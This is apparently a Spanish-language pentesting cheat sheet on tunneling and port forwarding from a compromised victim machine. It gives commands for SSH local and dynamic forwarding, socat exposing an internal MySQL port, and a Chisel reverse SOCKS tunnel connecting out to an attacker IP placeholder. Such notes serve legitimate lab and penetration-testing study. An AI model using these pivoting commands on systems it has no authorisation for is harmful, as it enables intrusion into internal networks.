---
title: "Tunneling & Port Forwarding"
layout: "single"
category: "Shells"
slug: "shells/tunneling"
date: "2025-11-26"
---

Técnicas para acceder a puertos internos que no están expuestos a internet.

### 1. SSH Port Forwarding
Si tienes credenciales SSH de la víctima.

**Local Port Forwarding (-L):**
"Traer un puerto de la víctima a mi Kali".
(Quiero ver el puerto 8080 de la víctima en mi puerto 8080).
```bash
ssh user@<IP_VICTIMA> -L 8080:127.0.0.1:8080
```

**Dynamic Port Forwarding (-D):**
"Crear un proxy SOCKS para ver TODA la red de la víctima".
```bash
ssh user@<IP_VICTIMA> -D 1080
# Luego configura /etc/proxychains.conf con: socks5 127.0.0.1 1080
```

### 2. Socat
Herramienta "navaja suiza" para redirigir tráfico.

**Exponer puerto interno hacia fuera:**
Si la víctima tiene el puerto 3306 (MySQL) cerrado al exterior, pero quieres que sea accesible en el puerto 4444 externo.
```bash
# En la víctima
./socat TCP-LISTEN:4444,fork TCP:127.0.0.1:3306 &
```

### 3. Chisel (EL REY del Tunneling HTTP)
Funciona incluso si solo sale tráfico HTTP/HTTPS.

**Escenario: Reverse Tunnel (SOCKS Proxy)**
1. **Atacante (Server):**
   ```bash
   ./chisel server -p 8000 --reverse
   ```
2. **Víctima (Client):**
   ```bash
   ./chisel client <IP_ATACANTE>:8000 R:socks
   ```
3. **Atacante:**
   Configura proxychains al puerto 1080 (por defecto de chisel).
